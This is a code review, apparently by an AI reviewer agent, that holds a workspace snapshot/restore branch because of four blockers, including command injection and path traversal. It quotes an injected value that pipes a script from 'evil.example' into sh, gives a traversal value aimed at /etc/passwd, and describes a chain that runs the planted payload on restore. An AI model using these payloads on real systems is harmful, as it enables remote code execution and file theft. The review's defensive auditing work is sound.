# Phase 1 Trident Review — verdict: **HOLD** (4 blockers)

**Branch:** `cmux-37/phase-1-snapshots-restore` @ `2047daff`
**Reviewer:** `agent:claude-opus-4-7-cmux-37-p1-review`
**Pack:** `notes/trident-review-CMUX-37-pack-20260424-1450/` (12 files: 9 reviews + 3 syntheses)

Nine reviewers (Claude Opus 4.7 / Codex GPT-5 / Gemini 3 Pro × Standard / Critical / Evolutionary) ran in parallel. **Critical synthesis = unanimous "NOT READY for production."** Four distinct blockers, each from a different angle. The architecture is sound — Foundation-only converter, clean registry shape, correct store/capture seam discipline all confirmed by every reviewer — but several boundary defects compose into a credible exploit chain.

## Blockers (must fix before merge)

### B1 — Shell injection via `claude.session_id` (CONFIRMED BY TWO REVIEWERS)

`Sources/AgentRestartRegistry.swift:65-74` only trims whitespace, then interpolates: `"cc --resume \(id)"`. The synthesized command is passed verbatim to `terminalPanel.sendText(cmd)` (`Sources/WorkspaceLayoutExecutor.swift:202-227`). `claude.session_id` is **not** in `SurfaceMetadataStore.reservedKeys` (`Sources/SurfaceMetadataStore.swift:143-152`), so any caller of `surface.set_metadata` (operator, agent, plugin) can plant `claude.session_id="; curl evil.example/x | sh"`. Independently flagged by Claude critical (B1) and Codex (P1, "real command-injection footgun unless the id is constrained or shell-quoted"). Fix: add to `reservedKeys` with a strict UUID-shaped grammar; defensively re-validate inside the registry resolver; add adversarial tests for shell metacharacters / embedded newlines / length bounds.

### B2 — Resume command never executes (Codex)

`AgentRestartRegistry.phase1` returns `"cc --resume \(id)"` with **no trailing newline**. `sendText` writes bytes verbatim. Restored Claude terminals sit at the prompt with the command typed but unsubmitted. The acceptance test only asserts `sent.contains(expected)` (`c11Tests/WorkspaceSnapshotRoundTripAcceptanceTests.swift:149`), so it blesses the broken state. **B1 + B2 must be fixed together** — the moment Enter is appended, B1 becomes immediately exploitable.

### B3 — Arbitrary file write / path traversal over v2 socket (Gemini)

`v2SnapshotCreate` accepts unconstrained `params["path"]` and passes it to `WorkspaceSnapshotStore.write(to:)`. A malicious agent can overwrite `~/.claude/settings.json` (or anything else) with snapshot JSON. `v2SnapshotRestore` accepts `params["snapshot_id"]` and resolves via `appendingPathComponent` with no traversal guard — `snapshot_id: "../../../../etc/passwd.json"` reads arbitrary `.json` files. Fix: restrict socket-initiated paths to `~/.c11-snapshots/` (CLI's local `--out <path>` use case stays allowed); add a traversal check before `appendingPathComponent`. Files: `Sources/TerminalController.swift` (v2SnapshotCreate, v2SnapshotRestore), `Sources/WorkspaceSnapshotStore.swift`.

### B4 — Phase 0 parity regression on whitespace commands (Gemini)

`Sources/WorkspaceLayoutExecutor.swift` Step 7 now trims explicit commands before `isEmpty` check. `command: " "` previously sent verbatim under Phase 0; now falls back to the registry, which returns `nil`, and the command is silently skipped. Fix: restore Phase 0 behavior or add a dedicated Phase 0 acceptance test that proves the diff is intentional.

### Compound risk (the headline)

B1 + B2 + B3 chain together: agent plants metadata via socket file-write → snapshot captures it → operator restores → payload executes once Enter is appended. None of these steps requires elevated permission. **Fix all four together.**

## Important (must address before Phase 2 builds on this seam)

1. **ULID generator entropy bug** — `Sources/WorkspaceSnapshot.swift:140-153` accumulator is 64 bits but loop extracts 80 via `acc >>= 5`. Every snapshot id has a deterministic 3-character `'0'` prefix at positions 10–12; 16 fewer bits of entropy than the comment claims. (Claude critical I1)
2. **`c11 restore` always creates a new workspace; not documented** — referenced `applyToExistingWorkspace` doesn't exist. Operator running restore twice gets duplicates with no warning. `Sources/TerminalController.swift:4582-4596`. (Claude critical I2)
3. **`c11 snapshot --workspace workspace:2` rejected despite being documented** — `parseUUIDFromRef` only accepts UUID-shaped values. `CLI/c11.swift:8120, 2723, 2862`. (Codex)
4. **`c11 restore --select true` accepted and silently ignored** — `snapshot.restore` not in `focusIntentV2Methods`. `Sources/TerminalController.swift:130, 2111, 4575`. (Codex)
5. **`c11 list-snapshots` plain-table uses `%s` for Swift `String`** — likely prints garbage or crashes; no test coverage. `CLI/c11.swift:2852, 2855`. (Codex; Codex reproduced via `swift -e`)
6. **`claudeSessionId` constant duplicated as literal across targets** — extract Foundation-only `WorkspaceMetadataKeys` shared between app and CLI, or add a build-time invariant test. `Sources/WorkspaceMetadataKeys.swift:29` vs `CLI/c11.swift:12640`. (Claude critical I5)
7. **Path detection in `runSnapshotRestore` is case-sensitive on `.json`** — `target.contains(".json")` misclassifies `.JSON`. `CLI/c11.swift:2769`.
8. **`snapshot.list` silently drops malformed snapshot files** — `try? read(from: url)` then `continue`. Surface as `unreadable` row. `Sources/WorkspaceSnapshotStore.swift:202-203`.
9. **Fractional seconds dropped from snapshot timestamps** — `encoder.dateEncodingStrategy = .iso8601` doesn't include fractional seconds; plan dictated "ISO-8601 with fractional seconds." (Gemini)

## Minor nits (PR description bait)

- `AgentRestartRegistry.named(_:)` silently falls back to Phase 0 on unknown wire names — typo undetectable.
- `ApplyOptions.==` returns false for two non-nil-but-identical registries.
- Acceptance suite is `#if DEBUG`-only; fails opaquely (rather than skipping) in Release.
- Plaintext `claude.session_id` on disk in `~/.c11-snapshots/`; undocumented.
- Orphan-socket / wrong-owner errors not in `isAdvisoryHookConnectivityError` advisory set.
- `WorkspaceSnapshotID.generate` calls the injected clock twice (ULID prefix and `created_at` can diverge by a tick).
- `AgentRestartRegistry.init(rows:)` does not trim `terminalType`; lookup mismatch risk.
- `pendingInitialInputForTests` is not thread-safe if `pendingTextQueue` is accessed off-main.

## Confirmed positives (worth preserving)

All 17 delegator focus areas check out structurally. Notably:

- **Converter purity holds** — `WorkspaceSnapshotConverter.swift` imports only `Foundation`; no env / file / store / AppKit work. Linux-portable as designed.
- **Phase 0 bit-exact preservation by default** — `ApplyOptions.restartRegistry` defaults to `nil`; executor synthesis only runs when non-nil. (Modulo B4 above for whitespace edge case.)
- **Explicit `SurfaceSpec.command` wins over registry** in executor step 7.
- **`claude.session_id` is on surface metadata, NOT pane metadata.**
- **Advisory hook semantics correct** — `097f79ca` mirrors `isAdvisoryHookConnectivityError`. Missing socket does not fail the hook.
- **Capture/restore seam isolation respected** — converter/registry/store non-isolated; capture walker `@MainActor`; env reads only at CLI layer.
- **Storage locations match brief** — writes to `~/.c11-snapshots/`; reads merge current and legacy.
- **Hot paths untouched** — only `GhosttyTerminalView.swift` change is a 10-line `#if DEBUG` accessor.
- **Submodules untouched** — `ghostty/`, `vendor/bonsplit/` pointers unchanged.
- **No install-side code introduced** — `skills/c11/references/claude-resume.md` is documentation only.

## Evolutionary signal (Phase 2 / 5 / wildcard)

All three Evolutionary reviewers independently land on the same framing: **Phase 1 is not snapshot/restore — it's the birth of a workspace runtime where `WorkspaceApplyPlan` is the executable IR.** Two compounding near-term investments converge across reviews:

1. **Content hash + optional lineage fields on the envelope** (~30–60 LOC) → unlocks dedupe, snapshot DAG, diff, bisect, GitOps, property-based fuzz invariants.
2. **`RestartIntent` value type** replacing the registry's `String?` return — keeps Phase 1 unchanged, prevents Phase 5 from collapsing under per-agent special cases.

See `notes/trident-review-CMUX-37-pack-20260424-1450/synthesis-evolutionary.md` for the full set.

## Cross-references

- **Full pack:** `notes/trident-review-CMUX-37-pack-20260424-1450/`
- **Critical synthesis (start here for the blockers):** `notes/trident-review-CMUX-37-pack-20260424-1450/synthesis-critical.md`
- **Standard synthesis:** `notes/trident-review-CMUX-37-pack-20260424-1450/synthesis-standard.md`
- **Evolutionary synthesis:** `notes/trident-review-CMUX-37-pack-20260424-1450/synthesis-evolutionary.md`

## Recommendation

**Hold.** Fix B1–B4 together (the compound exploit chain is the headline; fixing B2 alone makes B1 immediately live). Land I1–I9 in a follow-up before Phase 2 builds on this seam — both the unvalidated metadata pipe and the unconstrained socket path surface get much harder to lock down once additional consumers exist. Estimated scope: half a day to a day of focused work plus tests. The architecture itself does not need to move.
